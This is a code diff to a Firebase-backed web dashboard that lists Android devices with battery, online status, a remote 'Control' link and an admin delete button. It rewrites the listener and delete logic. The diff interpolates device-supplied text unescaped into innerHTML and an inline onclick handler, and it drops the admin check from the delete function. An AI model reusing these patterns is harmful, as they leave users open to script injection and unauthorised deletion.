+                        <i class="fas fa-mobile-alt" style="color: ${isOnline ? 'var(--primary)' : 'var(--text-muted)'}; font-size: 0.95rem;"></i>
+                        ${model}
+                    </div>
+                    <code style="font-size: 0.7rem; color: var(--text-muted);">${d.did}</code>
                 </td>
-                ${ownerCell}
-                <td><i class="fas ${bi}" style="margin-right:4px;"></i>${d.battery}%</td>
-                <td><span class="${st}">${sl}</span></td>
-                <td style="text-align:right;">
-                    <div style="display:inline-flex;align-items:center;gap:6px;">
-                        <a href="${controlUrl}" class="btn-accent" style="text-decoration:none;padding:7px 14px;font-size:0.75rem;">
-                            <i class="fas fa-terminal" style="margin-right:4px;"></i>Control
+                ${isAdmin ? `
+                <td>
+                    <span class="glass-badge" style="font-size: 0.65rem;">
+                        <i class="fas fa-user" style="color: var(--primary);"></i> ${ownerUid}
+                    </span>
+                </td>
+                ` : ''}
+                <td>
+                    <span style="font-size: 0.82rem; font-weight: 600; color: ${battColor}; display: inline-flex; align-items: center; gap: 5px;">
+                        <i class="fas ${battIcon}"></i> ${batt}%
+                    </span>
+                </td>
+                <td>
+                    <span class="${statusClass}">
+                        ${statusText}
+                    </span>
+                </td>
+                <td style="text-align: right;">
+                    <div style="display: flex; gap: 6px; justify-content: flex-end;">
+                        <a href="control.html?uid=${ownerUid}&did=${d.did}" class="btn-accent" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                            Control <i class="fas fa-chevron-right" style="margin-left: 4px; font-size: 0.7rem;"></i>
                         </a>
-                        ${deleteBtnHtml}
+                        ${isAdmin ? `
+                        <button onclick="deleteDevice('${ownerUid}', '${d.did}', '${model}')" class="btn-danger-ghost" style="padding: 6px 10px; border-radius: var(--radius-pill);" title="Delete Device">
+                            <i class="fas fa-trash-alt"></i>
+                        </button>
+                        ` : ''}
                     </div>
                 </td>
-            </tr>`;
+            </tr>
+            `;
         });
-        body.innerHTML = h;
+
+        // Update badge counters
+        const countBadge = document.getElementById('deviceCount');
+        const onlineBadge = document.getElementById('onlineCount');
+        if (countBadge) countBadge.textContent = totalCount;
+        if (onlineBadge) {
+            onlineBadge.textContent = `${onlineCount} online`;
+            onlineBadge.style.color = onlineCount > 0 ? 'var(--success)' : 'var(--danger)';
+            onlineBadge.style.background = onlineCount > 0 ? 'var(--success-bg)' : 'var(--danger-bg)';
+            onlineBadge.style.borderColor = onlineCount > 0 ? 'var(--success-border)' : 'var(--danger-border)';
+        }
+
+        if (totalCount === 0) {
+            tbody.innerHTML = `
+            <tr>
+                <td colspan="${isAdmin ? '5' : '4'}" style="text-align: center; padding: 40px 20px; color: var(--text-muted);">
+                    <i class="fas fa-mobile-alt" style="font-size: 2rem; color: var(--primary); opacity: 0.4; margin-bottom: 10px; display: block;"></i>
+                    <p style="font-size: 0.88rem; margin-bottom: 4px;">No devices connected yet</p>
+                    <p style="font-size: 0.76rem; color: var(--text-dim);">Build and install the APK on your Android device to see it appear here.</p>
+                </td>
+            </tr>`;
+        } else {
+            tbody.innerHTML = html;
+        }
+
+        // Hide skeleton and reveal list
+        const skeleton = document.getElementById('deviceSkeleton');
+        const listArea = document.getElementById('deviceListArea');
+        if (skeleton) skeleton.style.display = 'none';
+        if (listArea) listArea.style.display = 'block';
     }
 
     function deleteDevice(ownerUid, did, model) {
-        if (!window.isUserAdmin && !checkIsAdmin()) {
-            alert('Only admins can delete devices.');
+        if (!confirm(`Are you sure you want to permanently delete device "${model}" (${did}) from account "${ownerUid}"?`)) {
             return;
         }
-
-        if (!confirm(`Are you sure you want to delete device "${model}" (${did}) from Firebase?`)) {
-            return;
-        }
-
-        fbDb.ref('users/' + ownerUid + '/devices/' + did).remove().then(() => {
-            const cacheKey = ownerUid + '_' + did;
-            delete deviceCache[cacheKey];
-            delete healthListeners[cacheKey];
+        fbDb.ref(`users/${ownerUid}/devices/${did}`).remove().then(() => {
+            delete deviceCache[did];
             renderDeviceList();
-            if (fbAuth.currentUser) {
-                trackUserActivity(fbAuth.currentUser, `Deleted Device: ${model} (${did})`);
-            }
         }).catch(err => {
-            alert('Failed to delete device: ' + err.message);
+            alert('Delete failed: ' + err.message);
         });
     }
 
-    // Realtime health listeners for serverless setup with Admin vs Normal User Isolation
     function setupRealtimeHealthListeners() {
-        // Clear previous listeners and cache
-        fbDb.ref('users').off();
-        if (userId) {
-            fbDb.ref('users/' + userId + '/devices').off();
-        }
-        deviceCache = {};
+        // Clear previous listeners & cache
+        Object.keys(healthListeners).forEach(k => {
+            if (typeof healthListeners[k] === 'function') healthListeners[k]();
+        });
         healthListeners = {};
+        deviceCache = {};
 
         const isAdmin = checkIsAdmin();
 
-        const listenToUserDevices = (targetUid, ownerEmail = '') => {
-            const devicesRef = fbDb.ref('users/' + targetUid + '/devices');
-            
-            devicesRef.once('value', snap => {
-                if (!snap.exists() || !snap.hasChildren()) {
-                    renderDeviceList();
-                }
-            });
-
-            devicesRef.on('child_added', snap => {
-                const did = snap.key;
-                const cacheKey = targetUid + '_' + did;
-                if (healthListeners[cacheKey]) return;
-                
-                healthListeners[cacheKey] = true;
-                
-                const healthRef = fbDb.ref('users/' + targetUid + '/devices/' + did + '/health');
-                const infoRef = fbDb.ref('users/' + targetUid + '/devices/' + did + '/info');
-                
-                healthRef.on('value', hSnap => {
-                    const health = hSnap.val() || {};
-                    const now = Date.now();
-                    
-                    let is_online = health.online === true || health.online === 'true' || health.online === 1;
-                    if (is_online && health.lastSeen) {
-                        if ((now - health.lastSeen) > 90000) is_online = false;
-                    }
-                    
-                    if (!deviceCache[cacheKey]) {
-                        deviceCache[cacheKey] = { cacheKey: cacheKey, did: did, ownerUid: targetUid, ownerEmail: ownerEmail || targetUid, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
-                    }
-                    deviceCache[cacheKey].battery = health.battery || 0;
-                    deviceCache[cacheKey].is_online = is_online;
-                    deviceCache[cacheKey].lastSeen = health.lastSeen || 0;
-                    renderDeviceList();
-                });
-                
-                infoRef.on('value', iSnap => {
-                    const info = iSnap.val() || {};
-                    if (!deviceCache[cacheKey]) {
-                        deviceCache[cacheKey] = { cacheKey: cacheKey, did: did, ownerUid: targetUid, ownerEmail: ownerEmail || targetUid, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
-                    }
-                    deviceCache[cacheKey].model = info.model || info.brand || 'Unknown';
-                    if (info.email) deviceCache[cacheKey].ownerEmail = info.email;
-                    renderDeviceList();
-                });
-            });
-            
-            devicesRef.on('child_removed', snap => {
-                const did = snap.key;
-                const cacheKey = targetUid + '_' + did;
-                delete deviceCache[cacheKey];
-                delete healthListeners[cacheKey];
-                fbDb.ref('users/' + targetUid + '/devices/' + did + '/health').off();
-                fbDb.ref('users/' + targetUid + '/devices/' + did + '/info').off();
-                renderDeviceList();
-            });
-        };
-
         if (isAdmin) {
-            // ADMIN: Listen to ALL users' devices across the root 'users' node
-            const usersRef = fbDb.ref('users');
-            
-            usersRef.once('value', snap => {
-                if (!snap.exists() || !snap.hasChildren()) {
-                    renderDeviceList();
-                }
+            // ADMIN: Listen across all users in root /users
+            const usersRootRef = fbDb.ref('users');
+            const onChildAdded = usersRootRef.on('child_added', userSnap => {
+                const targetUid = userSnap.key;
+                listenToUserDevices(targetUid);
             });
-
-            usersRef.on('child_added', uSnap => {
-                const targetUid = uSnap.key;
-                const uData = uSnap.val() || {};
-                const uEmail = uData.email || uData.user_email || targetUid;
-                listenToUserDevices(targetUid, uEmail);
-            });
-
-            usersRef.on('child_removed', uSnap => {
-                const targetUid = uSnap.key;
-                Object.keys(deviceCache).forEach(cacheKey => {
-                    if (deviceCache[cacheKey].ownerUid === targetUid) {
-                        delete deviceCache[cacheKey];
-                        delete healthListeners[cacheKey];
+            const onChildRemoved = usersRootRef.on('child_removed', userSnap => {
+                const targetUid = userSnap.key;
+                Object.keys(deviceCache).forEach(did => {
+                    if (deviceCache[did].ownerUid === targetUid) {
+                        delete deviceCache[did];
                     }
                 });
-                fbDb.ref('users/' + targetUid + '/devices').off();
                 renderDeviceList();
             });
+            healthListeners['root_users_added'] = () => usersRootRef.off('child_added', onChildAdded);
+            healthListeners['root_users_removed'] = () => usersRootRef.off('child_removed', onChildRemoved);
         } else {
-            // NORMAL USER: ONLY listen to personal devices
-            listenToUserDevices(userId, currentUserProfile ? currentUserProfile.email : userId);
+            // STANDARD USER: Listen exclusively to their own devices
+            listenToUserDevices(userId);
         }
     }
 
+    function listenToUserDevices(targetUid) {
+        const devRef = fbDb.ref('users/' + targetUid + '/devices');
+        
+        const onDevAdded = devRef.on('child_added', devSnap => {
+            const did = devSnap.key;
+            if (!deviceCache[did]) {
+                deviceCache[did] = { did: did, ownerUid: targetUid, online: false, battery: '--', model: 'Android Device' };
+            }
+
+            // Real-time Health Listener
+            const healthRef = fbDb.ref(`users/${targetUid}/devices/${did}/health`);
+            const onHealth = healthRef.on('value', hSnap => {
+                const h = hSnap.val() || {};
+                let isOnline = h.online === true || h.online === 'true' || h.online === 1;
+                // Staleness check: if lastSeen is older than 90s, consider offline
+                if (isOnline && h.lastSeen) {
+                    const age = Date.now() - h.lastSeen;
+                    if (age > 90000) isOnline = false;
+                }
+                if (deviceCache[did]) {
+                    deviceCache[did].online = isOnline;
+                    deviceCache[did].battery = h.battery !== undefined ? h.battery : deviceCache[did].battery;
+                    deviceCache[did].lastSeen = h.lastSeen || 0;
+                    renderDeviceList();
+                }
+            });
+            healthListeners[`${did}_health`] = () => healthRef.off('value', onHealth);
+
+            // Real-time Info Listener
+            const infoRef = fbDb.ref(`users/${targetUid}/devices/${did}/info`);
+            const onInfo = infoRef.on('value', iSnap => {
+                const info = iSnap.val() || {};
+                if (deviceCache[did]) {
+                    deviceCache[did].model = info.model || info.device_name || deviceCache[did].model;
+                    renderDeviceList();
+                }
+            });
+            healthListeners[`${did}_info`] = () => infoRef.off('value', onInfo);
+        });
+
+        const onDevRemoved = devRef.on('child_removed', devSnap => {
+            const did = devSnap.key;
+            delete deviceCache[did];
+            renderDeviceList();
+        });
+
+        healthListeners[`${targetUid}_dev_added`] = () => devRef.off('child_added', onDevAdded);
+        healthListeners[`${targetUid}_dev_removed`] = () => devRef.off('child_removed', onDevRemoved);
+
+        // Initial render after brief query
+        devRef.once('value', () => {
+            renderDeviceList();
+        });
+    }
+
     function refreshDevices() {
-        document.getElementById('deviceSkeleton').style.display = 'block';
-        document.getElementById('deviceListArea').style.display = 'none';
+        const skeleton = document.getElementById('deviceSkeleton');
+        const listArea = document.getElementById('deviceListArea');
+        if (skeleton) skeleton.style.display = 'block';
+        if (listArea) listArea.style.display = 'none';
         setupRealtimeHealthListeners();
     }
     </script>
